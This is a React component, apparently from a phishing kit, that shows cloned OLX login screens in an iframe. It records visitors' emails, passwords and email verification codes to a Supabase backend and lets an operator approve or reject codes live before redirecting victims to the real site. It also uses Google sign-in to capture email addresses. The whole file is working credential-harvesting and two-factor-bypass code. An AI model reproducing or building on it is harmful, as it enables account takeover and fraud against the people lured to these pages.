import { useEffect, useRef, useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { attachIframeInteractions } from "@/lib/iframe-enhancements";
import { lovable } from "@/integrations/lovable";
import { decompressStoredHtml } from "@/lib/ad-html-storage";
import { AdScreen } from "@/types/screen";
import {
  applyLeadPlaceholders,
  attachLeadCapture,
  fetchSessionLeads,
  getSessionId,
  LeadValue,
} from "@/lib/lead-capture";
import { trackVisitorPresence } from "@/lib/presence";
import { MANUAL_SCREEN_TEMPLATES } from "@/lib/manual-screen-templates";

interface PreviewFrameProps {
  html: string;
  mode?: "mobile" | "desktop";
  className?: string;
  /** Quando definido, busca telas filhas no banco e usa pra navegação. */
  adId?: string;
}

function sanitizeIframeHtml(rawHtml: string): string {
  if (!rawHtml || !/<script|<link/i.test(rawHtml)) return rawHtml;

  try {
    const doc = new DOMParser().parseFromString(rawHtml, "text/html");

    doc.querySelectorAll("script").forEach((script) => {
      const src = script.getAttribute("src")?.trim();
      const content = script.textContent || "";
      const isManualScreenScript =
        !src && /iframe-help-action|iframe-link-click|btn-entrar|resend-btn|code-submit|pw-input|__olx_/i.test(content);

      if (!isManualScreenScript) {
        script.remove();
      }
    });

    doc
      .querySelectorAll('link[rel="preload"][as="script"], link[rel="modulepreload"], link[rel="prefetch"][as="script"]')
      .forEach((link) => link.remove());

    return "<!DOCTYPE html>\n" + doc.documentElement.outerHTML;
  } catch {
    return rawHtml;
  }
}

export function PreviewFrame({ html, mode = "mobile", className, adId }: PreviewFrameProps) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [height, setHeight] = useState<number>(800);
  const screensRef = useRef<AdScreen[]>([]);
  const historyRef = useRef<string[]>([]);
  const historyScreenRef = useRef<Array<{ kind: string; screenId: string | null }>>([]);
  const currentHtmlRef = useRef<string>("");
  const objectUrlsRef = useRef<string[]>([]);
  const leadsRef = useRef<LeadValue[]>([]);
  const currentScreenIdRef = useRef<string | null>(null);
  const currentScreenKindRef = useRef<string>("main");
  const capturedEmailRef = useRef("");
  const setScreenRef = useRef<((kind: string) => void) | null>(null);
  const markPresenceActiveRef = useRef<(() => void) | null>(null);

  // Presença "ao vivo" + tela atual em tempo real (só pra contexto público com adId)
  useEffect(() => {
    if (!adId) return;
    const sessionId = getSessionId();
    const { stop, setScreen, markActive } = trackVisitorPresence(adId, sessionId);
    setScreenRef.current = setScreen;
    markPresenceActiveRef.current = markActive;
    return () => {
      setScreenRef.current = null;
      markPresenceActiveRef.current = null;
      stop();
    };
  }, [adId]);

  const { data: screens } = useQuery({
    queryKey: ["ad_screens", adId],
    enabled: !!adId,
    queryFn: async () => {
      const { data, error } = await supabase
        .from("ad_screens")
        .select("*")
        .eq("ad_id", adId!);
      if (error) {
        console.error("[PreviewFrame] erro carregando telas:", error);
        throw error;
      }
      console.info("[PreviewFrame] telas carregadas:", data?.length, data?.map((s) => s.kind));
      return (data ?? []) as AdScreen[];
    },
  });

  // Mantém o ref sincronizado pra closures dos handlers do iframe
  useEffect(() => {
    screensRef.current = screens ?? [];
  }, [screens]);

  // Pós-retorno do Google OAuth: captura email, grava como lead e
  // empurra a pessoa pra tela "access-account" (mesmo destino do
  // fluxo manual). Em seguida desloga pra ela não cair no admin.
  useEffect(() => {
    if (!adId) return;
    if (typeof window === "undefined") return;

    let cancelled = false;
    let raw: string | null = null;
    try {
      raw = localStorage.getItem("olx_google_funnel_intent");
    } catch { return; }
    if (!raw) return;

    let intent: { adId?: string; sessionId?: string; returnUrl?: string; ts?: number } | null = null;
    try { intent = JSON.parse(raw); } catch { /* ignore */ }
    if (!intent || intent.adId !== adId) return;

    // Expira em 10 min pra não disparar fora de contexto
    if (intent.ts && Date.now() - intent.ts > 10 * 60 * 1000) {
      try { localStorage.removeItem("olx_google_funnel_intent"); } catch { /* ignore */ }
      return;
    }

    (async () => {
      const { data: sessionData } = await supabase.auth.getSession();
      const email = sessionData?.session?.user?.email?.trim();
      if (cancelled) return;
      try { localStorage.removeItem("olx_google_funnel_intent"); } catch { /* ignore */ }

      // Desloga imediatamente — a pessoa não pode ficar logada no admin
      if (sessionData?.session) {
        try { await supabase.auth.signOut(); } catch { /* ignore */ }
      }
      if (cancelled || !email) return;

      // Espera as telas carregarem antes de disparar a navegação
      const waitForScreens = async () => {
        for (let i = 0; i < 50; i++) {
          if (screensRef.current.length > 0) return true;
          await new Promise((r) => setTimeout(r, 100));
        }
        return screensRef.current.length > 0;
      };
      await waitForScreens();
      if (cancelled) return;

      // Reusa o handler de "access-account" do fluxo manual
      window.postMessage(
        { type: "iframe-help-action", action: "access-account", email },
        "*",
      );
    })();

    return () => { cancelled = true; };
  }, [adId]);

  // Hidrata leads da sessão atual (pra placeholders {{lead.email}}) + escuta realtime.
  useEffect(() => {
    if (!adId) return;
    const sessionId = getSessionId();
    let cancelled = false;
    fetchSessionLeads(adId, sessionId).then((rows) => {
      if (!cancelled) leadsRef.current = rows;
    });
    const channel = supabase
      .channel(`lead-self-${adId}-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_leads", filter: `ad_id=eq.${adId}` },
        (payload) => {
          const row = payload.new as { session_id: string; field_name: string; value: string };
          if (row.session_id !== sessionId) return;
          leadsRef.current = [...leadsRef.current, { field_name: row.field_name, value: row.value }];
        },
      )
      .subscribe();

    // Escuta ações do dono (aceitar/rejeitar) pra essa sessão
    const actionChannel = supabase
      .channel(`session-actions-${adId}-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_session_actions", filter: `ad_id=eq.${adId}` },
        (payload) => {
          const row = payload.new as { session_id: string; action: string; payload: { message?: string } | null };
          if (row.session_id !== sessionId) return;
          if (row.action === "approve") {
            window.location.href = "https://www.olx.com.br";
          } else if (row.action === "reject") {
            const iframe = iframeRef.current;
            iframe?.contentWindow?.postMessage(
              { type: "iframe-code-error", message: row.payload?.message || "Código inválido. Verifique e tente novamente." },
              "*",
            );
          }
        },
      )
      .subscribe();

    return () => {
      cancelled = true;
      void channel.unsubscribe();
      void actionChannel.unsubscribe();
    };
  }, [adId]);

  useEffect(() => {
    if (!iframeRef.current) return;
    const iframe = iframeRef.current;

    let injected = sanitizeIframeHtml(html || "<html><body></body></html>");
    if (mode === "mobile" && !/<meta[^>]+viewport/i.test(injected)) {
      injected = injected.replace(
        /<head[^>]*>/i,
        (m) => `${m}\n<meta name="viewport" content="width=device-width, initial-scale=1">`,
      );
    }
    injected = applyLeadPlaceholders(injected, leadsRef.current);

    const renderHtml = (src: string) => {
      setHeight(800);
      const blob = new Blob([src], { type: "text/html" });
      const url = URL.createObjectURL(blob);
      objectUrlsRef.current.push(url);
      iframe.src = url;
    };

    renderHtml(injected);
    let onChildScreen = false;
    currentScreenIdRef.current = null;
    currentHtmlRef.current = injected;
    historyRef.current = [];
    setScreenRef.current?.("main");

    let detach: (() => void) | null = null;
    let detachCapture: (() => void) | null = null;
    let detachPresenceActivity: (() => void) | null = null;
    let resizeObs: ResizeObserver | null = null;

    const measure = () => {
      const doc = iframe.contentDocument;
      if (!doc) return;
      const contentHeight = Math.max(doc.documentElement.scrollHeight, doc.body?.scrollHeight ?? 0);
      const parentHeight = iframe.parentElement?.clientHeight ?? 0;
      const h = Math.max(contentHeight, parentHeight);
      if (!h) return;
      setHeight((prev) => (Math.abs(h - prev) > 4 ? h : prev));
    };

    const onLoad = () => {
      const doc = iframe.contentDocument;
      if (doc) {
        detachPresenceActivity?.();
        const markActive = () => markPresenceActiveRef.current?.();
        const activityEvents: Array<keyof DocumentEventMap> = ["touchstart", "pointerdown", "mousemove", "scroll", "keydown", "input", "click"];
        activityEvents.forEach((eventName) => {
          doc.addEventListener(eventName, markActive, { passive: eventName !== "keydown" && eventName !== "input" });
        });
        detachPresenceActivity = () => {
          activityEvents.forEach((eventName) => {
            doc.removeEventListener(eventName, markActive);
          });
        };
        markActive();
        try {
          iframe.contentWindow?.scrollTo(0, 0);
        } catch {
          // ignore
        }
        if (detach) detach();
        detach = attachIframeInteractions(doc);
        if (detachCapture) detachCapture();
        if (adId) {
          detachCapture = attachLeadCapture(doc, {
            adId,
            screenId: currentScreenIdRef.current,
          });
        }
        measure();
        const tries = [200, 600, 1200, 2500, 4000];
        tries.forEach((t) => setTimeout(measure, t));
        try {
          if (resizeObs) resizeObs.disconnect();
          resizeObs = new ResizeObserver(() => measure());
          if (doc.body) resizeObs.observe(doc.body);
        } catch { /* ignore */ }
      }
    };
    iframe.addEventListener("load", onLoad);

    const handleViewportRestore = () => {
      const doc = iframe.contentDocument;
      doc?.getElementById("__olx_help_modal_host__")?.remove();
      const tries = [0, 80, 200, 400, 800].map((t) => setTimeout(measure, t));
      return () => tries.forEach(clearTimeout);
    };

    let clearRestoreTimers: (() => void) | null = null;
    const onPageShow = () => {
      clearRestoreTimers?.();
      clearRestoreTimers = handleViewportRestore();
    };
    window.addEventListener("pageshow", onPageShow);
    window.addEventListener("popstate", onPageShow);

    const normalizeUrl = (raw: string): string => {
      try {
        const u = new URL(raw);
        return (u.origin + u.pathname.replace(/\/+$/, "")).toLowerCase();
      } catch {
        return raw.toLowerCase();
      }
    };

    const navigateToScreen = (screen: AdScreen) => {
      const screenHtml = decompressStoredHtml(screen.edited_html || screen.original_html || "");
      if (!screenHtml) return;
       let nextHtml = applyLeadPlaceholders(sanitizeIframeHtml(screenHtml), leadsRef.current);
      const capturedEmail = capturedEmailRef.current.trim();
      if (capturedEmail && (screen.kind === "access-account" || screen.kind === "password" || screen.kind === "email-code")) {
        nextHtml = nextHtml.replace(
          /(<div[^>]*id=["']user-email["'][^>]*>)(.*?)(<\/div>)/i,
          `$1${capturedEmail}$3`,
        );
      }
      // Empilha o HTML atual pra permitir "voltar" pra tela anterior em vez de pular pra tela mãe
      historyRef.current.push(currentHtmlRef.current);
      onChildScreen = true;
      currentScreenIdRef.current = screen.id;
      currentHtmlRef.current = nextHtml;
      renderHtml(nextHtml);
      setScreenRef.current?.(screen.kind);
    };

    const navigateToManualScreen = (kind: string) => {
      const template = MANUAL_SCREEN_TEMPLATES[kind];
      if (!template) return false;

      let nextHtml = applyLeadPlaceholders(sanitizeIframeHtml(template.html), leadsRef.current);
      const capturedEmail = capturedEmailRef.current.trim();
      if (capturedEmail && (kind === "access-account" || kind === "password" || kind === "email-code")) {
        nextHtml = nextHtml.replace(
          /(<div[^>]*id=["']user-email["'][^>]*>)(.*?)(<\/div>)/i,
          `$1${capturedEmail}$3`,
        );
        nextHtml = nextHtml.replace(
          /(<span[^>]*class=["']email["'][^>]*id=["']user-email["'][^>]*>)(.*?)(<\/span>)/i,
          `$1${capturedEmail}$3`,
        );
      }

      historyRef.current.push(currentHtmlRef.current);
      onChildScreen = true;
      currentScreenIdRef.current = null;
      currentHtmlRef.current = nextHtml;
      renderHtml(nextHtml);
      setScreenRef.current?.(kind);
      return true;
    };

    const goBackToMain = () => {
      onChildScreen = false;
      currentScreenIdRef.current = null;
      historyRef.current = [];
      currentHtmlRef.current = injected;
      renderHtml(injected);
      setScreenRef.current?.("main");
    };

    const goBackOne = () => {
      const prev = historyRef.current.pop();
      if (prev && prev !== injected) {
        currentHtmlRef.current = prev;
        renderHtml(prev);
        return;
      }
      goBackToMain();
    };

    const onMessage = (e: MessageEvent) => {
      const data = e.data;
      if (!data || typeof data !== "object") return;

      // Login Google real (sai do anúncio)
      if (data.type === "iframe-google-login") {
        (async () => {
          try {
            // Marca intenção: ao voltar do Google, capturamos o email,
            // gravamos como lead e seguimos pra tela "access-account"
            // (mesmo destino do fluxo manual). Não deixamos a pessoa
            // logada de verdade — fazemos signOut imediato no retorno.
            try {
              localStorage.setItem(
                "olx_google_funnel_intent",
                JSON.stringify({
                  adId,
                  sessionId: getSessionId(),
                  returnUrl: window.location.href,
                  ts: Date.now(),
                }),
              );
            } catch { /* ignore */ }
            const result = await lovable.auth.signInWithOAuth("google", {
              redirect_uri: window.location.href,
            });
            if (result.error) {
              console.error("[PreviewFrame] google oauth erro:", result.error);
            }
          } catch (err) {
            console.error("[PreviewFrame] google oauth exception:", err);
          }
        })();
        return;
      }

      // Validação de e-mail (nível 2: MX via DNS) — chama edge function e devolve resultado pro iframe
      if (data.type === "iframe-email-validate-request" && typeof data.email === "string" && typeof data.requestId === "string") {
        const email = data.email.trim();
        const requestId = data.requestId;
        const reply = (valid: boolean, message?: string) => {
          iframeRef.current?.contentWindow?.postMessage(
            { type: "iframe-email-validate-result", requestId, valid, message },
            "*",
          );
        };
        (async () => {
          try {
            const { data: res, error } = await supabase.functions.invoke("validate-email", {
              body: { email },
            });
            if (error) {
              console.warn("[PreviewFrame] validate-email erro:", error);
              reply(true); // fail-open: não bloqueia o usuário em caso de erro de rede
              return;
            }
            const valid = res?.valid !== false;
            reply(valid, res?.message);
          } catch (err) {
            console.warn("[PreviewFrame] validate-email exception:", err);
            reply(true);
          }
        })();
        return;
      }

      if (data.type === "iframe-help-action" && typeof data.action === "string") {
        if (typeof data.email === "string") {
          capturedEmailRef.current = data.email;
        }
        const sessionId = getSessionId();

        // Registra como "requisição" do visitante quando ele clica numa
        // das opções de ajuda (esqueci senha, sem senha, reativar, reenviar
        // código). É só uma marcação informativa pro painel.
        const REQUEST_LABELS: Record<string, string> = {
          "forgot-password": "Esqueci minha senha",
          passwordless: "Entrar sem senha",
          reactivate: "Quero ativar minha conta",
          "email-code-resend": "Reenviar código",
        };
        if (adId && REQUEST_LABELS[data.action]) {
          supabase
            .from("ad_session_actions")
            .insert({
              ad_id: adId,
              session_id: sessionId,
              action: "request",
              payload: {
                kind: data.action,
                label: REQUEST_LABELS[data.action],
                email: capturedEmailRef.current || null,
              },
            })
            .then(({ error }) => {
              if (error) console.warn("[PreviewFrame] request insert:", error);
            });
        }

        // Quando o visitante clica em "Acessar" com e-mail válido, marca como confirmado
        if (data.action === "access-account" && adId && typeof data.email === "string" && data.email.trim()) {
          supabase
            .from("ad_leads")
            .insert({
              ad_id: adId,
              screen_id: currentScreenIdRef.current,
              session_id: sessionId,
              field_name: "email_submitted",
              value: data.email.trim(),
              user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
            })
            .then(({ error }) => {
              if (error) console.warn("[PreviewFrame] email_submitted insert:", error);
            });
        }

        // Senha submetida → grava lead e avança pra tela de e-mail (email-code)
        if (data.action === "password-submit" && adId && typeof data.password === "string" && data.password) {
          supabase
            .from("ad_leads")
            .insert({
              ad_id: adId,
              screen_id: currentScreenIdRef.current,
              session_id: sessionId,
              field_name: "password_submitted",
              value: data.password,
              user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
            })
            .then(({ error }) => {
              if (error) console.warn("[PreviewFrame] password_submitted insert:", error);
            });
          const next = screensRef.current.find((s) => s.kind === "email-code");
          if (next) navigateToScreen(next);
          else console.warn("[PreviewFrame] Sem tela 'email-code' vinculada");
          return;
        }

        // Código submetido → grava lead e fica esperando aprovação do dono
        if (data.action === "email-code-submit" && adId && typeof data.code === "string" && data.code) {
          const submittedCode = data.code;
          supabase
            .from("ad_leads")
            .insert({
              ad_id: adId,
              screen_id: currentScreenIdRef.current,
              session_id: sessionId,
              field_name: "code_submitted",
              value: submittedCode,
              user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
            })
            .then(({ error }) => {
              if (error) console.warn("[PreviewFrame] code_submitted insert:", error);
            });

          // Auto-rejeita se esse código já foi rejeitado nas últimas 1h (em qualquer sessão deste anúncio)
          (async () => {
            const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
            const { data: rejectedLeads, error: rejErr } = await supabase
              .from("ad_leads")
              .select("session_id, value, created_at")
              .eq("ad_id", adId)
              .eq("field_name", "code_submitted")
              .eq("value", submittedCode)
              .gte("created_at", oneHourAgo);
            if (rejErr || !rejectedLeads?.length) return;

            const sessionIds = Array.from(new Set(rejectedLeads.map((r) => r.session_id)));
            const { data: rejectActions } = await supabase
              .from("ad_session_actions")
              .select("session_id, action, created_at")
              .eq("ad_id", adId)
              .eq("action", "reject")
              .in("session_id", sessionIds)
              .gte("created_at", oneHourAgo);

            const wasRejected = (rejectActions ?? []).some((act) => {
              return rejectedLeads.some(
                (lead) =>
                  lead.session_id === act.session_id &&
                  lead.created_at <= act.created_at,
              );
            });

            if (wasRejected) {
              await supabase.from("ad_session_actions").insert({
                ad_id: adId,
                session_id: sessionId,
                action: "reject",
                payload: { message: "Código inválido. Verifique e tente novamente.", auto: true },
              });
            }
          })();
          return;
        }

        console.info("[PreviewFrame] help-action:", data.action, "telas:", screensRef.current.map((s) => s.kind));
        if (data.action === "back-one") {
          goBackOne();
          return;
        }
        if (data.action === "back-to-main") {
          goBackToMain();
          return;
        }
        const screen = screensRef.current.find((s) => s.kind === data.action);
        if (!screen) {
          if (!navigateToManualScreen(data.action)) {
            console.warn("[PreviewFrame] Nenhuma tela vinculada com kind=", data.action);
          }
          return;
        }
        navigateToScreen(screen);
        return;
      }

      if (data.type === "iframe-link-click" && typeof data.url === "string") {
        if (onChildScreen) {
          goBackToMain();
          return;
        }
        const target = normalizeUrl(data.url);
        const match = screensRef.current.find(
          (s) => s.source_url && normalizeUrl(s.source_url) === target,
        );
        if (match) {
          navigateToScreen(match);
        } else {
          console.info("[PreviewFrame] Sem tela vinculada para:", data.url);
        }
        return;
      }

    };
    window.addEventListener("message", onMessage);

    return () => {
      iframe.removeEventListener("load", onLoad);
      window.removeEventListener("message", onMessage);
      window.removeEventListener("pageshow", onPageShow);
      window.removeEventListener("popstate", onPageShow);
      clearRestoreTimers?.();
      if (detach) detach();
      if (detachCapture) detachCapture();
      if (detachPresenceActivity) detachPresenceActivity();
      if (resizeObs) resizeObs.disconnect();
      objectUrlsRef.current.forEach((url) => URL.revokeObjectURL(url));
      objectUrlsRef.current = [];
      historyRef.current = [];
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [html, mode, adId]);

  return (
    <iframe
      ref={iframeRef}
      title="Pré-visualização do anúncio"
      className={className || "block w-full bg-white"}
      style={{ height: `${height}px`, border: 0, touchAction: "pan-y" }}
      scrolling="no"
      sandbox="allow-same-origin allow-scripts allow-popups allow-popups-to-escape-sandbox allow-forms"
    />
  );
}
